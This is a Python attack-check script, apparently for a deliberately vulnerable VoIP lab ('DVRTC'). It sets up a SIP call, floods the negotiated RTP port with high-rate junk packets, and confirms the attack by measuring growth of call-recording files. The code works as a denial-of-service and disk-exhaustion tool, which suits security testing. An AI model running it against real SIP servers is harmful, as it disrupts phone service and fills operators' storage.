#!/usr/bin/env python3
"""Place a SIP call, flood the negotiated RTP target, and verify recording growth."""

from __future__ import annotations

import argparse
from contextlib import closing
from dataclasses import dataclass
import html
import ipaddress
import random
import re
import socket
import struct
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Callable


DEFAULT_SIP_PORT = 5060
HTTP_USER_AGENT = "rtpflood/1.0"
SIP_STATUS_RE = re.compile(r"^SIP/2.0\s+(\d{3})")
SIP_TAG_RE = re.compile(r";tag=([^;>\s]+)")
SDP_AUDIO_RE = re.compile(r"^m=audio\s+(\d+)\s+", re.MULTILINE)
SDP_CONN_RE = re.compile(r"^c=IN\s+IP(4|6)\s+(\S+)", re.MULTILINE)
RECORDINGS_ROW_RE = re.compile(
    r'<tr><td class="link"><a href="([^"]+\.pcap)"[^>]*>.*?</a></td>'
    r'<td class="size">([^<]+)</td>',
    re.IGNORECASE,
)


@dataclass(frozen=True)
class SipDialog:
    call_id: str
    from_tag: str
    branch: str

    @classmethod
    def create(cls) -> SipDialog:
        return cls(
            call_id=f"rtpflood-{random.randint(100000, 999999)}@checks.local",
            from_tag=f"rtpflood-{random.randint(100000, 999999)}",
            branch=f"z9hG4bK-rtpflood-{random.randint(100000, 999999)}",
        )


@dataclass(frozen=True)
class SipResponse:
    code: int
    headers: dict[str, list[str]]
    body: str


@dataclass
class ActiveCall:
    sip_sock: socket.socket
    rtp_sock: socket.socket
    local_sip_ip: str
    local_sip_port: int
    dialog: SipDialog
    from_user: str
    from_domain: str
    to_uri: str
    to_tag: str
    request_uri: str
    route_uris: list[str]
    rtp_host: str
    rtp_port: int
    remote_sip_port: int = DEFAULT_SIP_PORT

    @property
    def recording_name(self) -> str:
        return f"{self.dialog.call_id}={self.dialog.from_tag}.pcap"


def _info(message: str) -> None:
    print(message, flush=True)


def _fail(message: str) -> int:
    print(f"[!] {message}", flush=True)
    return 1


def _normalize_host(host: str) -> str:
    if host.startswith("[") and host.endswith("]"):
        return host[1:-1]
    return host


def _is_ipv6_literal(host: str) -> bool:
    try:
        return ipaddress.ip_address(_normalize_host(host)).version == 6
    except ValueError:
        return False


def _format_uri_host(host: str) -> str:
    normalized = _normalize_host(host)
    if _is_ipv6_literal(normalized):
        return f"[{normalized}]"
    return normalized


def _format_hostport(host: str, port: int) -> str:
    return f"{_format_uri_host(host)}:{port}"


def _resolve_target(host: str, port: int, socktype: int) -> tuple[int, int, int, tuple]:
    infos = socket.getaddrinfo(_normalize_host(host), port, type=socktype)
    if not infos:
        raise OSError(f"could not resolve {host}:{port}")
    return infos[0][0], infos[0][1], infos[0][2], infos[0][4]


def _bind_addr_for_family(family: int, port: int = 0) -> tuple:
    if family == socket.AF_INET6:
        return ("::", port, 0, 0)
    return ("0.0.0.0", port)


def _local_ip_for_target(host: str, port: int = DEFAULT_SIP_PORT) -> str:
    infos = socket.getaddrinfo(_normalize_host(host), port, type=socket.SOCK_DGRAM)
    if not infos:
        return "127.0.0.1"

    family, _, proto, _, sockaddr = infos[0]
    with closing(socket.socket(family, socket.SOCK_DGRAM, proto)) as probe:
        try:
            probe.connect(sockaddr)
            ip = probe.getsockname()[0]
            if ip and ip != "0.0.0.0":
                return ip
        except OSError:
            pass

    if family == socket.AF_INET6:
        fallback_target = ("2606:4700::1", 80, 0, 0)
    else:
        fallback_target = ("8.8.8.8", 80)

    with closing(socket.socket(family, socket.SOCK_DGRAM)) as probe:
        try:
            probe.connect(fallback_target)
            ip = probe.getsockname()[0]
            if ip:
                return ip
        except OSError:
            pass

    return "::1" if family == socket.AF_INET6 else "127.0.0.1"


def _http_get_text(url: str, timeout: float = 5.0) -> tuple[int, str]:
    request = urllib.request.Request(url, headers={"User-Agent": HTTP_USER_AGENT})
    with urllib.request.urlopen(request, timeout=timeout) as response:
        body = response.read().decode("utf-8", errors="replace")
        return response.getcode(), body


def _recordings_index_url(host: str, subpath: str = "") -> str:
    normalized = subpath.strip("/")
    if normalized:
        return f"http://{_format_uri_host(host)}/recordings/{normalized}/"
    return f"http://{_format_uri_host(host)}/recordings/"


def _parse_size_bytes(value: str) -> int:
    text = value.strip()
    if not text or text == "-":
        return 0
    number_text, _, unit_text = text.partition(" ")
    number = float(number_text)
    unit = unit_text.strip() or "Bytes"
    factors = {
        "B": 1,
        "Bytes": 1,
        "Byte": 1,
        "KiB": 1024,
        "MiB": 1024**2,
        "GiB": 1024**3,
    }
    factor = factors.get(unit)
    if factor is None:
        raise ValueError(f"unsupported size unit {unit!r}")
    return int(number * factor)


def _fetch_recordings_index(host: str, subpath: str = "") -> dict[str, int]:
    status_code, body = _http_get_text(_recordings_index_url(host, subpath), timeout=5.0)
    path_label = f"/recordings/{subpath.strip('/')}/".replace("//", "/")
    if status_code != 200:
        raise RuntimeError(f"{path_label} returned HTTP {status_code}")

    prefix = f"{subpath.strip('/')}/" if subpath.strip("/") else ""
    recordings: dict[str, int] = {}
    for href, size_text in RECORDINGS_ROW_RE.findall(body):
        filename = urllib.parse.unquote(html.unescape(href))
        recordings[f"{prefix}{filename}"] = _parse_size_bytes(size_text)
    return recordings


def _fetch_recordings(host: str) -> dict[str, int]:
    recordings = _fetch_recordings_index(host)
    try:
        recordings.update(_fetch_recordings_index(host, "spool"))
    except RuntimeError:
        pass
    return recordings


def _build_sdp_offer(local_ip: str, local_port: int) -> str:
    ip_family = "IP6" if _is_ipv6_literal(local_ip) else "IP4"
    session_id = random.randint(100000, 999999)
    lines = [
        "v=0",
        f"o=rtpflood 1 {session_id} IN {ip_family} {_normalize_host(local_ip)}",
        "s=DVRTC RTP flood check",
        f"c=IN {ip_family} {_normalize_host(local_ip)}",
        "t=0 0",
        f"m=audio {local_port} RTP/AVP 0",
        "a=rtpmap:0 PCMU/8000",
        "a=sendrecv",
    ]
    return "\r\n".join(lines) + "\r\n"


def _build_invite(
    target_host: str,
    extension: str,
    local_ip: str,
    local_port: int,
    user_agent: str,
    *,
    dialog: SipDialog,
    from_user: str,
    sdp_body: str,
) -> str:
    target_uri_host = _format_uri_host(target_host)
    local_hostport = _format_hostport(local_ip, local_port)
    lines = [
        f"INVITE sip:{extension}@{target_uri_host} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_hostport};branch={dialog.branch};rport",
        "Max-Forwards: 70",
        f"To: <sip:{extension}@{target_uri_host}>",
        f"From: <sip:{from_user}@{target_uri_host}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        "CSeq: 1 INVITE",
        f"Contact: <sip:{from_user}@{local_hostport}>",
        f"User-Agent: {user_agent}",
        "Content-Type: application/sdp",
        f"Content-Length: {len(sdp_body.encode('utf-8'))}",
        "",
        sdp_body,
    ]
    return "\r\n".join(lines)


def _build_in_dialog_request(
    method: str,
    request_uri: str,
    local_ip: str,
    local_port: int,
    user_agent: str,
    *,
    dialog: SipDialog,
    from_user: str,
    from_domain: str,
    to_uri: str,
    to_tag: str,
    route_uris: list[str],
    cseq: int,
) -> str:
    local_hostport = _format_hostport(local_ip, local_port)
    lines = [
        f"{method} {request_uri} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_hostport};branch={dialog.branch}-{method.lower()};rport",
        "Max-Forwards: 70",
        f"To: <{to_uri}>;tag={to_tag}",
        f"From: <sip:{from_user}@{_format_uri_host(from_domain)}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        f"CSeq: {cseq} {method}",
        f"Contact: <sip:{from_user}@{local_hostport}>",
        f"User-Agent: {user_agent}",
    ]
    for route_uri in route_uris:
        lines.append(f"Route: <{route_uri}>")
    lines.extend(["Content-Length: 0", "", ""])
    return "\r\n".join(lines)


def _parse_sip_message(data: bytes) -> SipResponse:
    text = data.decode("utf-8", errors="ignore")
    header_text, _, body = text.partition("\r\n\r\n")
    lines = header_text.split("\r\n")
    first_line = lines[0] if lines else ""
    match = SIP_STATUS_RE.match(first_line)
    code = int(match.group(1)) if match else 0

    headers: dict[str, list[str]] = {}
    for line in lines[1:]:
        if not line:
            break
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        headers.setdefault(key.strip().lower(), []).append(value.strip())

    return SipResponse(code=code, headers=headers, body=body)


def _collect_sip_messages(
    sock: socket.socket,
    response_window: float,
    *,
    stop_when: Callable[[SipResponse, list[SipResponse]], bool] | None = None,
) -> list[SipResponse]:
    messages: list[SipResponse] = []
    sock.settimeout(0.2)
    deadline = time.time() + response_window
    while time.time() < deadline:
        try:
            data, _ = sock.recvfrom(8192)
        except socket.timeout:
            continue
        response = _parse_sip_message(data)
        if response.code:
            messages.append(response)
            if stop_when is not None and stop_when(response, messages):
                break
    return messages


def _final_response(response: SipResponse, _messages: list[SipResponse]) -> bool:
    return response.code >= 200


def _first_header(response: SipResponse, name: str) -> str:
    values = response.headers.get(name.lower(), [])
    return values[0] if values else ""


def _header_uris(response: SipResponse, name: str) -> list[str]:
    uris: list[str] = []
    for value in response.headers.get(name.lower(), []):
        uri = _extract_uri(value)
        if uri:
            uris.append(uri)
    return uris


def _extract_uri(header_value: str) -> str:
    match = re.search(r"<([^>]+)>", header_value)
    if match:
        return match.group(1).strip()
    raw = header_value.split(";", 1)[0].strip()
    if raw.startswith("sip:"):
        return raw
    return ""


def _extract_tag(header_value: str) -> str:
    match = SIP_TAG_RE.search(header_value)
    return match.group(1) if match else ""


def _extract_rtp_target(sdp_body: str) -> tuple[str, int]:
    conn_match = SDP_CONN_RE.search(sdp_body)
    port_match = SDP_AUDIO_RE.search(sdp_body)
    if conn_match is None or port_match is None:
        raise RuntimeError("could not parse remote RTP target from SDP")
    return conn_match.group(2), int(port_match.group(1))


def _start_call(
    host: str,
    extension: str,
    *,
    from_user: str,
    user_agent: str,
    response_window: float,
    sip_port: int = DEFAULT_SIP_PORT,
) -> ActiveCall:
    family, socktype, proto, sockaddr = _resolve_target(host, sip_port, socket.SOCK_DGRAM)

    sip_sock = socket.socket(family, socktype, proto)
    rtp_sock = socket.socket(family, socket.SOCK_DGRAM, proto)
    try:
        sip_sock.bind(_bind_addr_for_family(family))
        rtp_sock.bind(_bind_addr_for_family(family))

        local_sip_ip = _local_ip_for_target(host, sip_port)
        local_sip_port = sip_sock.getsockname()[1]
        local_rtp_port = rtp_sock.getsockname()[1]
        dialog = SipDialog.create()
        sdp_offer = _build_sdp_offer(local_sip_ip, local_rtp_port)
        invite = _build_invite(
            host,
            extension,
            local_sip_ip,
            local_sip_port,
            user_agent,
            dialog=dialog,
            from_user=from_user,
            sdp_body=sdp_offer,
        )
        sip_sock.sendto(invite.encode("utf-8"), sockaddr)

        responses = _collect_sip_messages(
            sip_sock,
            response_window,
            stop_when=_final_response,
        )
        if not responses:
            raise RuntimeError("no SIP response received for INVITE")

        final_response = responses[-1]
        if final_response.code != 200:
            raise RuntimeError(f"INVITE failed with SIP {final_response.code}")

        to_header = _first_header(final_response, "to")
        to_uri = _extract_uri(to_header)
        to_tag = _extract_tag(to_header)
        if not to_uri or not to_tag:
            raise RuntimeError("INVITE 200 OK was missing To URI or tag")

        request_uri = _extract_uri(_first_header(final_response, "contact"))
        if not request_uri:
            request_uri = f"sip:{extension}@{_format_uri_host(host)}"

        route_uris = _header_uris(final_response, "record-route")
        rtp_host, rtp_port = _extract_rtp_target(final_response.body)

        ack = _build_in_dialog_request(
            "ACK",
            request_uri,
            local_sip_ip,
            local_sip_port,
            user_agent,
            dialog=dialog,
            from_user=from_user,
            from_domain=_normalize_host(host),
            to_uri=to_uri,
            to_tag=to_tag,
            route_uris=route_uris,
            cseq=1,
        )
        sip_sock.sendto(ack.encode("utf-8"), sockaddr)

        return ActiveCall(
            sip_sock=sip_sock,
            rtp_sock=rtp_sock,
            local_sip_ip=local_sip_ip,
            local_sip_port=local_sip_port,
            dialog=dialog,
            from_user=from_user,
            from_domain=_normalize_host(host),
            to_uri=to_uri,
            to_tag=to_tag,
            request_uri=request_uri,
            route_uris=route_uris,
            rtp_host=rtp_host,
            rtp_port=rtp_port,
            remote_sip_port=sip_port,
        )
    except Exception:
        sip_sock.close()
        rtp_sock.close()
        raise


def _hangup_call(call: ActiveCall, *, user_agent: str, response_window: float) -> None:
    try:
        sockaddr = _resolve_target(call.from_domain, call.remote_sip_port, socket.SOCK_DGRAM)[3]
        bye = _build_in_dialog_request(
            "BYE",
            call.request_uri,
            call.local_sip_ip,
            call.local_sip_port,
            user_agent,
            dialog=call.dialog,
            from_user=call.from_user,
            from_domain=call.from_domain,
            to_uri=call.to_uri,
            to_tag=call.to_tag,
            route_uris=call.route_uris,
            cseq=2,
        )
        call.sip_sock.sendto(bye.encode("utf-8"), sockaddr)
        _collect_sip_messages(call.sip_sock, response_window, stop_when=_final_response)
    finally:
        call.sip_sock.close()
        call.rtp_sock.close()


def _send_rtp_flood(
    sock: socket.socket,
    *,
    host: str,
    port: int,
    duration: float,
    packet_rate: int,
    payload_size: int,
    payload_type: int,
) -> tuple[int, int]:
    packet_rate = max(1, packet_rate)
    payload_size = max(1, payload_size)

    payload = bytes([0x55]) * payload_size
    sequence = random.randint(0, 65535)
    timestamp = random.randint(0, 2**32 - 1)
    ssrc = random.randint(0, 2**32 - 1)
    sample_step = max(160, payload_size)
    send_interval = 1.0 / packet_rate

    deadline = time.monotonic() + duration
    next_send = time.monotonic()
    packets = 0
    bytes_sent = 0

    while True:
        now = time.monotonic()
        if now >= deadline:
            break
        if now < next_send:
            time.sleep(min(next_send - now, 0.01))
            continue

        header = struct.pack(
            "!BBHII",
            0x80,
            payload_type & 0x7F,
            sequence & 0xFFFF,
            timestamp & 0xFFFFFFFF,
            ssrc & 0xFFFFFFFF,
        )
        packet = header + payload
        sock.sendto(packet, (_normalize_host(host), port))
        packets += 1
        bytes_sent += len(packet)
        sequence += 1
        timestamp += sample_step
        next_send += send_interval

    return packets, bytes_sent


def cmd_rtpflood(args: argparse.Namespace) -> int:
    try:
        before = _fetch_recordings(args.recordings_host)
    except (RuntimeError, urllib.error.URLError, ValueError) as exc:
        return _fail(f"could not read recordings index before test ({exc})")

    _info(
        f"[*] RTP flood: placing SIP call to {args.extension} via "
        f"{_format_hostport(args.host, args.sip_port)}"
    )

    try:
        call = _start_call(
            args.host,
            args.extension,
            from_user=args.from_user,
            user_agent="DVRTC-RTP-FLOOD",
            response_window=args.response_window,
            sip_port=args.sip_port,
        )
    except RuntimeError as exc:
        return _fail(f"could not establish SIP call ({exc})")
    except OSError as exc:
        return _fail(f"socket setup failed ({exc})")

    try:
        _info(
            f"    [+] Remote RTP target is {_format_hostport(call.rtp_host, call.rtp_port)}"
        )
        _info(
            f"[*] RTP flood: sending {args.payload_size}-byte payloads at "
            f"{args.packet_rate} packets/sec for {args.duration:.1f}s"
        )
        packets, bytes_sent = _send_rtp_flood(
            call.rtp_sock,
            host=call.rtp_host,
            port=call.rtp_port,
            duration=args.duration,
            packet_rate=args.packet_rate,
            payload_size=args.payload_size,
            payload_type=args.payload_type,
        )
        _info(f"    [+] Sent {packets} packets / {bytes_sent} bytes of RTP payload")
        time.sleep(args.post_flood_linger)
    finally:
        _hangup_call(call, user_agent="DVRTC-RTP-FLOOD", response_window=args.response_window)

    _info(f"[*] Waiting {args.recording_settle:.1f}s for rtpproxy to flush the recording")
    time.sleep(args.recording_settle)

    try:
        after = _fetch_recordings(args.recordings_host)
    except (RuntimeError, urllib.error.URLError, ValueError) as exc:
        return _fail(f"could not read recordings index after test ({exc})")

    expected_paths = (
        call.recording_name,
        f"spool/{call.recording_name}",
    )
    expected_growth = {
        path: after.get(path, 0) - before.get(path, 0)
        for path in expected_paths
        if after.get(path, 0) - before.get(path, 0) > 0
    }
    if expected_growth:
        largest_name, largest_growth = max(expected_growth.items(), key=lambda item: item[1])
        _info(f"    [*] Flood recording growth: {largest_name} (+{largest_growth} bytes)")
        if largest_growth >= args.min_recording_growth:
            _info("[+] RTP flood susceptibility confirmed")
            return 0

    growth = {
        name: after.get(name, 0) - before.get(name, 0)
        for name in after
        if after.get(name, 0) - before.get(name, 0) > 0
    }
    if not growth:
        return _fail("no recording growth detected after RTP flood call")

    largest_name, largest_growth = max(growth.items(), key=lambda item: item[1])
    _info(f"    [*] Largest recording growth: {largest_name} (+{largest_growth} bytes)")

    if largest_growth < args.min_recording_growth:
        return _fail(
            "recording growth stayed below threshold "
            f"({largest_growth} < {args.min_recording_growth} bytes)"
        )

    _info("[+] RTP flood susceptibility confirmed")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Place a SIP call, flood its RTP target, and confirm recording growth"
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--sip-port", type=int, default=DEFAULT_SIP_PORT)
    parser.add_argument("--recordings-host", default="127.0.0.1")
    parser.add_argument("--extension", default="1200")
    parser.add_argument("--from-user", default="rtpflood")
    parser.add_argument("--duration", type=float, default=3.0)
    parser.add_argument("--packet-rate", type=int, default=1000)
    parser.add_argument("--payload-size", type=int, default=1200)
    parser.add_argument("--payload-type", type=int, default=0)
    parser.add_argument("--min-recording-growth", type=int, default=1_048_576)
    parser.add_argument("--recording-settle", type=float, default=5.0)
    parser.add_argument("--post-flood-linger", type=float, default=0.5)
    parser.add_argument("--response-window", type=float, default=8.0)
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return cmd_rtpflood(args)


if __name__ == "__main__":
    raise SystemExit(main())
